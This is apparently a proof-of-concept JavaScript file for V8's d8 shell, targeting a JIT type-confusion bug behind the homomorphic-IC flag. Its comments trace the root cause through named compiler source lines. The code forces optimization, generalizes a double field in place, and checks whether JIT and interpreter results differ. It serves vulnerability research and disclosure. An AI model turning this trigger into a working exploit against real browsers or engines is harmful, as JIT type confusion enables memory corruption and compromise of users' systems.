// PoC 9: Homomorphic IC Double-Field Type Confusion
//
// Bug: In ReduceHomomorphicAccess (js-native-context-specialization.cc:1883),
//      a double-represented property field has its FieldAccess.type set to
//      Type::OtherInternal(). A CheckHeapObject guard is then added at line 1894
//      to protect a subsequent LoadField(ForMap(), result) in case the field was
//      in-place generalized from Double to Tagged.
//
//      However, TypedOptimization::ReduceCheckHeapObject (typed-optimization.cc:166)
//      sees input_type = Type::OtherInternal() which is DISJOINT from
//      Type::SignedSmall() (different bitset bits), so the condition
//      !input_type.Maybe(Type::SignedSmall()) == true triggers, and the
//      CheckHeapObject guard is REMOVED.
//
//      After removal, if the Double field was in-place generalized to Tagged
//      (which V8 can do without a map transition), the compiled code:
//        - Loads the field → gets a Smi (e.g. 42)
//        - Calls LoadField(ForMap(), Smi_value) — dereferences Smi bits as ptr
//        - This is a type confusion / controlled arbitrary read
//
// Relevant source paths:
//   src/compiler/js-native-context-specialization.cc:1808–1912 ReduceHomomorphicAccess
//   src/compiler/typed-optimization.cc:166–174               ReduceCheckHeapObject
//   src/compiler/turbofan-types.h:131,118,114                OtherInternal vs Smi bits
//   src/objects/map-updater.cc:1396–1407                     GeneralizeField + deopt
//
// Root cause chain:
//   1. field_access.type = Type::OtherInternal()         (line 1884)
//   2. CheckHeapObject(loadField) added                   (line 1894)
//   3. TypedOptimization: OtherInternal ∩ SignedSmall = ∅ → CheckHeapObject removed
//   4. No kFieldRepresentationGroup dependency registered → no deopt on generalization
//   5. In-place Double→Tagged generalization produces Smi in the field slot
//   6. LoadField(ForMap(), Smi_value) → controlled OOB read
//
// Note: Requires --homomorphic-ic flag (false by default, enabled by --future).
//       Without this flag, ReduceHomomorphicAccess is not reached and the bug
//       is not triggered.
//
// Requirements:
//   --homomorphic-ic (or --future)
//   --homomorphic-ic-count=<n> (default 8, must be >= # of distinct receiver maps)
//   --allow-natives-syntax (for %OptimizeFunctionOnNextCall)
//
// Run with:
//   ./d8 --future --allow-natives-syntax poc9_homomorphic_double_field_confusion.js
// or:
//   ./d8 --homomorphic-ic --allow-natives-syntax poc9_homomorphic_double_field_confusion.js

"use strict";

// ---- Stage 1: Build homomorphic receiver set with double field ----
// All objects share the same initial map and have property 'x' as a
// Double-represented field (HeapNumber box).

function makeDoubleObj(val) {
  // Force val into a heap number slot by assigning a non-Smi float first.
  const o = { x: 1.5 };
  o.x = val;
  return o;
}

const N_RECV = 20;  // More than homomorphic_ic_count so IC sees many receivers
const receivers = [];
for (let i = 0; i < N_RECV; i++) {
  receivers.push(makeDoubleObj(i * 1.1 + 0.5));  // All floats → Double field
}

// ---- Stage 2: Property access function for JIT warm-up ----
function readX(o) {
  return o.x;
}

// Warm up readX to:
//   1. Trigger Ignition → Maglev/Turbofan tiers
//   2. Build homomorphic IC feedback with many distinct receivers
for (let iter = 0; iter < 20000; iter++) {
  readX(receivers[iter % N_RECV]);
}

// Force optimization with the warm feedback
if (typeof %OptimizeFunctionOnNextCall === "function") {
  %OptimizeFunctionOnNextCall(readX);
  readX(receivers[0]);  // Trigger compilation
}

const v_baseline = readX(receivers[1]);
console.log("[BASELINE] readX(receivers[1]) =", v_baseline,
            "  (expected ~1.6, type:", typeof v_baseline, ")");

// ---- Stage 3: Trigger in-place Double→Tagged field generalization ----
// Assigning a Smi integer to 'x' on an object with the same map forces V8 to
// generalize the field representation from Double to Tagged in-place.
// Since the homomorphic IC code has no kFieldRepresentationGroup dependency,
// it is NOT deoptimized at this point.

receivers[5].x = 42;  // Smi assignment → triggers in-place generalization

// ---- Stage 4: Access the field via stale JIT code ----
// The compiled readX still believes x is a Double field:
//   - field_access.type = OtherInternal (stale)
//   - CheckHeapObject guard was removed by TypedOptimization
//   - LoadField(type=OtherInternal) now returns Smi(42) — a tagged integer
//   - Subsequent LoadField(ForMap(), Smi(42)) treats Smi bits as a heap pointer
//   - This is the type confusion: a Smi is used as a HeapObject address

const v_after = readX(receivers[5]);  // Field now holds Smi(42)
console.log("[AFTER GENERALIZATION] readX(receivers[5]) =", v_after,
            "  type:", typeof v_after);

if (typeof v_after === "number" && v_after === 42) {
  console.log("[INFO] Result is correct integer — CheckHeapObject+CheckIf(NotAHeapNumber)");
  console.log("[INFO] may have survived or deoptimization occurred.");
  console.log("[INFO] Try with --noturbo-store-elimination or check with --trace-deopt.");
} else if (typeof v_after !== "number") {
  console.log("[POTENTIAL TYPE CONFUSION] readX returned non-number:", v_after);
  console.log("[POTENTIAL TYPE CONFUSION] typeof:", typeof v_after);
} else {
  console.log("[INFO] Value differs from expected 42:", v_after);
  console.log("[INFO] May indicate a different code path was taken.");
}

// ---- Stage 5: Differential verification ----
// Compare JIT result vs interpreter (disable JIT with %NeverOptimizeFunction)
function readX_unoptimized(o) {
  return o.x;
}

if (typeof %NeverOptimizeFunction === "function") {
  %NeverOptimizeFunction(readX_unoptimized);
}

const v_interp = readX_unoptimized(receivers[5]);
console.log("[DIFFERENTIAL] JIT:", v_after, " Interpreter:", v_interp);

if (v_after !== v_interp) {
  console.log("[TYPE CONFUSION CONFIRMED] JIT and interpreter disagree!");
  console.log("  JIT returned:", v_after, "(type:", typeof v_after, ")");
  console.log("  Interpreter returned:", v_interp, "(type:", typeof v_interp, ")");
} else {
  console.log("[PASS] JIT and interpreter agree — no mismatch observed");
  console.log("[INFO] Bug may require specific optimization path or V8 version.");
}

// ---- Stage 6: Stress test with many receivers post-generalization ----
let mismatch_count = 0;
for (let i = 0; i < N_RECV; i++) {
  receivers[i].x = i * 7;  // Assign Smi values to all (force generalization across all)
  const jit_val = readX(receivers[i]);
  const ref_val = readX_unoptimized(receivers[i]);
  if (jit_val !== ref_val) {
    mismatch_count++;
    console.log("[MISMATCH] receiver[" + i + "]: JIT=" + jit_val + " ref=" + ref_val);
  }
}

if (mismatch_count > 0) {
  console.log("[TYPE CONFUSION CONFIRMED] " + mismatch_count + " mismatches detected!");
} else {
  console.log("[STRESS] No mismatches in post-generalization reads.");
}
